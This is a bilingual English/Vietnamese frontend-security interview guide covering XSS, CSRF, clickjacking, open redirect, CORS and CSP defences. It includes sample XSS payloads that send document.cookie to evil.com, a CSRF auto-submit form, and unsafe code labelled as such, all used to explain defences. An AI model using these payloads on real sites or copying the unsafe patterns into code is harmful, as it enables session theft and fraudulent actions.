# Common Web Vulnerabilities / Lỗ Hổng Web Phổ Biến

> **Track**: FE | **Difficulty**: 🟢 Junior → 🔴 Senior
> **See also**: [Authentication](./02-authentication.md) | [Shared OWASP](../../shared/04-security/03-web-security-owasp.md) | [Security Fundamentals](../../shared/04-security/01-security-fundamentals.md) | [Modern Auth Patterns](../../shared/04-security/04-modern-auth-patterns.md)

## Overview / Tổng Quan

Tài liệu này tổng hợp các lỗ hổng web phổ biến trong phỏng vấn Frontend và Fullstack.
Heading dùng tiếng Anh, phần diễn giải dùng tiếng Việt để dễ học và dễ diễn đạt khi phỏng vấn.

```
┌─────────────────────────────────────────────────────────┐
│              Frontend Security Threat Model              │
│                                                         │
│  User Input ──→ [XSS]                                   │
│  Cookie/Session ──→ [CSRF]                              │
│  UI Overlay ──→ [Clickjacking]                          │
│  URL Params ──→ [Open Redirect]                         │
│  API Calls ──→ [CORS Misconfiguration]                  │
│  Resource Loading ──→ [CSP Bypass]                      │
│                                                         │
│  Defense Layers:                                        │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────┐  │
│  │ Input    │ │ Output   │ │ Transport│ │ Browser   │  │
│  │Validation│ │ Encoding │ │ Security │ │ Policies  │  │
│  └──────────┘ └──────────┘ └──────────┘ └───────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## 1. Cross-Site Scripting (XSS)

### Overview / Tổng Quan
XSS cho phép attacker chèn script độc hại và chạy trong context trình duyệt của nạn nhân.

### Explanation / Giải thích

Ba loại chính: **Stored**, **Reflected**, **DOM-based**. Frontend thường dính do render HTML không sanitize.

```
┌─────────── XSS Types ───────────┐
│                                 │
│  Stored XSS:                    │
│  Attacker ──→ DB ──→ Victim     │
│  (comment, profile, post)       │
│                                 │
│  Reflected XSS:                 │
│  Attacker URL ──→ Server ──→    │
│  Response ──→ Victim            │
│                                 │
│  DOM-based XSS:                 │
│  Attacker URL ──→ Client JS     │
│  ──→ DOM manipulation           │
│  (no server roundtrip)          │
└─────────────────────────────────┘
```

### Example / Ví dụ

```tsx
// UNSAFE - chèn HTML thô trực tiếp
function Unsafe({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}

// SAFE - sanitize trước khi render
import DOMPurify from 'dompurify'
function SafeHtml({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
}
```

### XSS Defense Controls

| # | Control | Giải thích |
|---|---------|-----------|
| 1 | **Output encoding theo context** | Encode HTML entities cho HTML context, JS encoding cho JS context, URL encoding cho URL context. Không dùng chung 1 hàm encode cho mọi nơi |
| 2 | **Hạn chế `dangerouslySetInnerHTML`** | Chỉ dùng khi thật sự cần render rich text (CMS, markdown). Luôn sanitize bằng DOMPurify trước |
| 3 | **CSP với `script-src` nghiêm ngặt** | Dùng nonce-based hoặc hash-based CSP thay vì `'unsafe-inline'`. Chặn inline script injection |
| 4 | **Input validation + allowlist** | Validate schema ở cả client và server. Chỉ cho phép format mong đợi (email, phone, etc.) |
| 5 | **HttpOnly + Secure cookies** | Ngăn JavaScript đọc session cookie qua `document.cookie`. Giảm impact nếu XSS xảy ra |
| 6 | **Trusted Types API** | Browser API mới giúp ngăn DOM XSS bằng cách yêu cầu typed objects thay vì raw string cho DOM sinks |
| 7 | **Framework auto-escaping** | React tự escape JSX expressions. Vue tự escape `{{ }}`. Hiểu rõ khi nào framework KHÔNG auto-escape (v-html, dangerouslySetInnerHTML) |
| 8 | **Subresource Integrity (SRI)** | Thêm `integrity` hash vào `<script>` và `<link>` tags cho CDN resources. Ngăn tampered scripts |

---

## 2. Cross-Site Request Forgery (CSRF)

### Overview / Tổng Quan
CSRF lợi dụng cookie phiên đã đăng nhập để ép người dùng thực hiện hành động ngoài ý muốn.

### Explanation / Giải thích

```
┌─── CSRF Attack Flow ───────────────────┐
│                                        │
│  1. Victim logs into bank.com          │
│     (browser stores session cookie)    │
│                                        │
│  2. Victim visits evil.com             │
│                                        │
│  3. evil.com contains:                 │
│     <form action="bank.com/transfer"   │
│           method="POST">               │
│       <input name="to" value="hacker"/>│
│       <input name="amount" value="$$$"/>│
│     </form>                            │
│     <script>form.submit()</script>     │
│                                        │
│  4. Browser sends request WITH         │
│     bank.com cookies automatically     │
└────────────────────────────────────────┘
```

### CSRF Defense Controls

| # | Control | Giải thích |
|---|---------|-----------|
| 1 | **Synchronizer Token Pattern** | Server tạo CSRF token random gắn vào form/meta tag. Client gửi lại qua hidden field hoặc header `X-CSRF-Token`. Server verify mỗi request state-changing |
| 2 | **Double Submit Cookie** | Set CSRF token vào cookie + request header/body. Server so sánh 2 giá trị. Attacker không đọc được cookie cross-origin nên không thể forge |
| 3 | **SameSite Cookie attribute** | `SameSite=Lax` (default Chrome 80+): chặn cross-site POST. `SameSite=Strict`: chặn mọi cross-site request. Nên dùng Lax cho phần lớn trường hợp |
| 4 | **Origin/Referer header check** | Verify `Origin` hoặc `Referer` header match với domain mong đợi. Fallback defense, không nên dùng đơn lẻ |
| 5 | **Custom request headers** | API-only endpoints yêu cầu custom header (e.g., `X-Requested-With`). Simple requests không thể thêm custom headers cross-origin |
| 6 | **Token rotation** | Xoay CSRF token theo session hoặc theo form để giảm window of exploitation nếu token bị leak |

---

## 3. Clickjacking

### Overview / Tổng Quan
Clickjacking lừa người dùng click vào UI bị che giấu qua iframe chồng lớp.

### Explanation / Giải thích

```
┌─── Clickjacking Attack ──────────┐
│                                  │
│  Visible layer (evil.com):       │
│  ┌────────────────────────────┐  │
│  │  "Click here to win $$$!" │  │
│  │      [ CLICK ME ]          │  │
│  └────────────────────────────┘  │
│                                  │
│  Hidden iframe (bank.com):       │
│  ┌────────────────────────────┐  │
│  │  Transfer $1000?           │  │
│  │      [ CONFIRM ]  ← click │  │
│  └────────────────────────────┘  │
│  (opacity: 0, positioned over   │
│   the visible button)           │
└──────────────────────────────────┘
```

### Clickjacking Defense Controls

| # | Control | Giải thích |
|---|---------|-----------|
| 1 | **X-Frame-Options: DENY** | Ngăn trang bị nhúng trong bất kỳ iframe nào. Dùng `SAMEORIGIN` nếu cần iframe nội bộ |
| 2 | **CSP frame-ancestors** | `frame-ancestors 'none'` thay thế X-Frame-Options. Linh hoạt hơn: có thể chỉ định domain cụ thể được phép embed |
| 3 | **Frame-busting scripts** | JavaScript fallback: `if (top !== self) top.location = self.location`. Không đáng tin cậy vì có thể bị sandbox attribute vô hiệu hóa |
| 4 | **Sensitive action confirmation** | Yêu cầu re-authentication hoặc CAPTCHA cho actions quan trọng (payment, settings change). Defense-in-depth ngay cả khi frame protection bị bypass |

---

## 4. Open Redirect

### Overview / Tổng Quan
Open redirect cho phép attacker lợi dụng domain uy tín để chuyển hướng nạn nhân đến trang độc hại.

### Explanation / Giải thích
Thường xảy ra qua query params như `?next=`, `?redirect=`, `?returnUrl=`. Attacker craft URL: `trusted.com/login?next=evil.com`.

Vietnamese: Rất nguy hiểm vì victim thấy domain uy tín trong URL → tin tưởng click → bị redirect sang phishing site.

### Example / Ví dụ

```ts
// UNSAFE - redirect bất kỳ URL nào
const next = searchParams.get('next')
window.location.href = next // attacker controls destination!

// SAFE - allowlist + relative path only
const allowed = ['/dashboard', '/profile', '/settings']
const next = searchParams.get('next') ?? '/dashboard'
const safeNext = allowed.includes(next) ? next : '/dashboard'
window.location.href = safeNext
```

### Open Redirect Defense Controls

| # | Control | Giải thích |
|---|---------|-----------|
| 1 | **Allowlist paths/domains** | Chỉ cho phép redirect đến path hoặc domain đã đăng ký. Reject absolute URLs hoặc URLs với protocol khác |
| 2 | **Relative URL only** | Chỉ accept relative paths (`/dashboard`), reject absolute URLs (`https://evil.com`). Parse URL và validate không có protocol/host |
| 3 | **Indirect reference** | Dùng mapping ID thay vì raw URL: `?next=dashboard` → server lookup → `/dashboard`. Attacker không inject URL trực tiếp |
| 4 | **Warn before redirect** | Hiển thị interstitial page: "You are being redirected to X. Continue?" Cho user cơ hội nhận ra phishing |

---

## 5. CORS Misconfiguration

### Overview / Tổng Quan
CORS sai cấu hình có thể làm lộ API cho origin không đáng tin cậy.

### Explanation / Giải thích

```
┌─── CORS Flow ────────────────────────────┐
│                                          │
│  Browser (app.example.com):              │
│  fetch("https://api.example.com/data")   │
│                                          │
│  1. Preflight (OPTIONS):                 │
│     Origin: https://app.example.com      │
│                                          │
│  2. Server responds:                     │
│     Access-Control-Allow-Origin:         │
│       https://app.example.com  ✅        │
│       * (with credentials)    ❌         │
│       ${req.headers.origin}   ❌ DANGER  │
│                                          │
│  3. Browser enforces policy              │
└──────────────────────────────────────────┘
```

### CORS Defense Controls

| # | Control | Giải thích |
|---|---------|-----------|
| 1 | **Explicit origin allowlist** | Chỉ cho phép origins cụ thể. KHÔNG reflect `Origin` header trực tiếp vào `Access-Control-Allow-Origin` |
| 2 | **Không dùng wildcard với credentials** | `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` = browser sẽ block. Nhưng server vẫn xử lý → data leak qua non-browser clients |
| 3 | **Giới hạn methods và headers** | `Access-Control-Allow-Methods`: chỉ methods cần thiết. `Access-Control-Allow-Headers`: chỉ headers cần thiết |
| 4 | **Vary: Origin header** | Luôn set `Vary: Origin` khi ACAO thay đổi theo request. Ngăn cache poisoning |
| 5 | **Per-environment config** | Allowlist khác nhau cho dev/staging/prod. Audit định kỳ qua integration tests |
| 6 | **Preflight caching** | `Access-Control-Max-Age` hợp lý (e.g., 3600s) để giảm preflight requests nhưng không quá dài để allow nhanh revocation |

---

## 6. CSP and Security Headers

### Overview / Tổng Quan
Security headers là lớp phòng vệ quan trọng giúp giảm thiểu nhiều lớp tấn công trên trình duyệt.

### Explanation / Giải thích
Nên thiết lập CSP dạng deny-by-default, sau đó mở dần nguồn tài nguyên cần thiết.

### Essential Security Headers

| Header | Value | Tác dụng |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'; script-src 'nonce-xxx'` | Chặn inline scripts, chỉ cho phép nguồn tài nguyên đã khai báo |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Bắt buộc HTTPS, ngăn SSL stripping attacks |
| `X-Content-Type-Options` | `nosniff` | Ngăn browser MIME-sniffing, chặn polyglot attacks |
| `X-Frame-Options` | `DENY` hoặc `SAMEORIGIN` | Chống clickjacking (dùng CSP frame-ancestors thay thế) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Giới hạn thông tin referrer gửi cross-origin |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Disable browser APIs không cần thiết |

### CSP Rollout Strategy

```
Phase 1: Report-Only
  Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
  → Thu thập violations, KHÔNG block

Phase 2: Analyze Reports
  → Xác định legitimate sources bị block
  → Thêm vào allowlist (nonce, hash, domain)
  → Loại bỏ inline scripts dần

Phase 3: Enforce
  Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
  → Bật enforcement, vẫn giữ report-uri để monitor

Phase 4: Harden
  → Thêm strict-dynamic cho script chains
  → Remove 'unsafe-eval' nếu còn
  → Audit quarterly
```

---

## 7. Real-World Security Scenarios 🔴 Senior

### Scenario 1: Stored XSS trong Rich Text Editor
**Tình huống:** User submit blog post chứa `<img onerror="fetch('evil.com?c='+document.cookie)">`.
**Phát hiện:** CSP report-uri nhận violation report. WAF log alert.
**Xử lý:** Sanitize server-side bằng bleach/DOMPurify. Thêm CSP `img-src 'self'`. Audit lại tất cả user-generated content paths.
**Hậu kiểm:** Thêm automated XSS regression tests vào CI. Review CSP coverage.

### Scenario 2: CSRF bypass do SameSite=None
**Tình huống:** Payment API dùng `SameSite=None` cho cross-domain iframe checkout. Attacker craft form targeting payment endpoint.
**Phát hiện:** Anomaly detection: payment requests từ unexpected referrer.
**Xử lý:** Thêm CSRF token verification. Tighten SameSite policy. Add origin check middleware.
**Hậu kiểm:** Pentest cross-origin payment flow. Monitor referer distribution.

### Scenario 3: CORS Wildcard với Internal API
**Tình huống:** Internal microservice set `Access-Control-Allow-Origin: *` + credentials. External attacker đọc sensitive data via browser.
**Phát hiện:** Security audit phát hiện misconfigured CORS headers.
**Xử lý:** Replace wildcard với explicit allowlist. Add Vary: Origin. Review tất cả service CORS configs.
**Hậu kiểm:** CORS config scanner trong CI/CD pipeline.

### Scenario 4: Open Redirect chain cho OAuth phishing
**Tình huống:** `app.com/auth/callback?redirect=evil.com` → Attacker gửi OAuth link hợp lệ → Victim authorize → Token gửi về evil.com.
**Phát hiện:** User report phishing email chứa app.com URL.
**Xử lý:** Validate redirect_uri server-side với exact match (không dùng startsWith). Revoke compromised tokens.
**Hậu kiểm:** Add redirect_uri to OAuth security checklist. Penetration test auth flows.

### Scenario 5: CSP bypassed qua JSONP endpoint
**Tình huống:** CSP cho phép `script-src trusted-cdn.com`. CDN có JSONP endpoint → attacker inject arbitrary JS qua callback parameter.
**Phát hiện:** Security researcher report hoặc bug bounty.
**Xử lý:** Remove JSONP endpoints hoặc exclude từ CSP. Chuyển sang `strict-dynamic` với nonces.
**Hậu kiểm:** Audit tất cả allowed CSP sources cho JSONP/redirect/upload capabilities.

---

## Câu Hỏi Phỏng Vấn / Interview Q&A

### Q: What is XSS and why is it dangerous? / XSS là gì và vì sao nguy hiểm? 🟢 Junior

**A:** XSS (Cross-Site Scripting) allows attackers to inject malicious scripts that execute in victims' browsers.

Vietnamese: XSS cho phép chạy script độc hại trong browser của nạn nhân, có thể đánh cắp session, thao túng UI, redirect đến phishing site, hoặc keylog input. Ba loại: Stored (lưu trong DB), Reflected (qua URL), DOM-based (client-side JS xử lý input không an toàn).

**Ví dụ:** Comment chứa `<script>document.location='evil.com?c='+document.cookie</script>` được render thẳng mà không sanitize.

---

### Q: How does CSRF work? / CSRF hoạt động ra sao? 🟢 Junior

**A:** CSRF exploits the browser's automatic cookie-sending behavior to perform unauthorized actions on behalf of an authenticated user.

Vietnamese: Trình duyệt tự gửi cookie phiên khi request đến domain tương ứng. Attacker tạo trang chứa form/image/script tự động gửi request đến target site → server thấy cookie hợp lệ → thực hiện action.

**Ví dụ:** Form ẩn tự submit hành động chuyển tiền: `<form action="bank.com/transfer" method="POST"><input name="to" value="hacker"></form>`.

---

### Q: How would you design a CORS policy for a multi-tenant SaaS? / Bạn thiết kế policy CORS thế nào cho multi-tenant SaaS? 🟡 Mid

**A:** Use a dynamic allowlist based on verified tenant domains, not a wildcard or origin reflection.

Vietnamese: Mỗi tenant đăng ký domain → lưu trong DB → middleware lookup origin từ request header → so sánh với domain đã verify của tenant đó → set ACAO nếu match. Kèm `Vary: Origin` để tránh cache poisoning. Audit log mọi CORS rejection. Integration tests verify chỉ tenant's own domain được phép.

---

### Q: How do you deploy CSP without breaking production? / CSP triển khai thế nào để không phá production? 🟡 Mid

**A:** Roll out in phases: report-only → analyze → enforce → harden.

Vietnamese: Bắt đầu với `Content-Security-Policy-Report-Only` → thu thập violation reports 1-2 tuần → xác định legitimate sources → thêm vào policy → loại bỏ inline script dần (chuyển sang nonce/hash) → chuyển sang enforcement mode → vẫn giữ reporting để monitor violations mới. Có rollback plan: revert về report-only nếu phát hiện breakage.

---

### Q: How do you handle an XSS incident that has been exploited in production? / Bạn xử lý incident XSS đã khai thác trong production như thế nào? 🔴 Senior

**A:** Follow incident response framework: contain → eradicate → recover → post-mortem.

Vietnamese: (1) **Cô lập:** Xác định blast radius — bao nhiêu user bị ảnh hưởng, data nào bị lộ. Disable vulnerable endpoint hoặc deploy hotfix sanitization. (2) **Thu hồi:** Rotate tất cả session tokens, invalidate refresh tokens của affected users. (3) **Vá:** Fix input/output path — sanitize ở cả client và server. Thêm CSP chặt hơn. (4) **Hậu kiểm:** Thêm regression tests, update threat model, conduct security review cho similar patterns trong codebase. (5) **Communication:** Notify affected users nếu data bị compromised. Update security incident log.

---

### Q: What are the trade-offs between strict security headers and third-party integrations? / Trade-off giữa security headers nghiêm ngặt và third-party integrations? 🔴 Senior

**A:** Strict headers maximize security but can break analytics, payment widgets, and embedded content. Need governance + exception process.

Vietnamese: Header nghiêm ngặt (CSP, X-Frame-Options) chặn inline scripts, iframes, external resources → break Google Analytics, Stripe checkout, embedded videos. Giải pháp: (1) Dùng nonce-based CSP thay vì domain allowlist rộng. (2) Có exception process: team phải justify mỗi CSP relaxation. (3) Allowlist tối thiểu theo business-critical vendors. (4) Audit quarterly: remove vendors không còn dùng. (5) Dùng `report-uri` để monitor violations liên tục. Trade-off chính: DX/velocity vs security posture — cần align với risk appetite của tổ chức.

---

## Security Checklist cho Frontend Interview

```
Pre-deployment:
  □ CSP configured (report-only → enforce)
  □ HSTS enabled with preload
  □ X-Content-Type-Options: nosniff
  □ X-Frame-Options hoặc frame-ancestors set
  □ SameSite cookie attribute configured
  □ CSRF tokens cho state-changing operations
  □ Input validation + output encoding
  □ DOMPurify cho user-generated HTML
  □ Subresource Integrity cho CDN scripts
  □ CORS allowlist (không wildcard với credentials)

Ongoing:
  □ CSP violation monitoring
  □ Security regression tests trong CI
  □ Dependency vulnerability scanning (npm audit)
  □ Quarterly security header audit
  □ Penetration testing cho auth + payment flows
```

## Final Notes

### Overview / Tổng Quan
Học bảo mật web hiệu quả nhất là luyện theo threat model + control + verification.

### Explanation / Giải thích
Đọc tiếp [Authentication](./02-authentication.md) để nối mạch bảo mật phiên và phân quyền.
Xem thêm [Web Security OWASP](../../shared/04-security/03-web-security-owasp.md) để hiểu OWASP Top 10 đầy đủ.

### Example / Ví dụ
Kết hợp checklist OWASP vào CI/CD review: mỗi PR phải pass security linting + CSP compliance check.
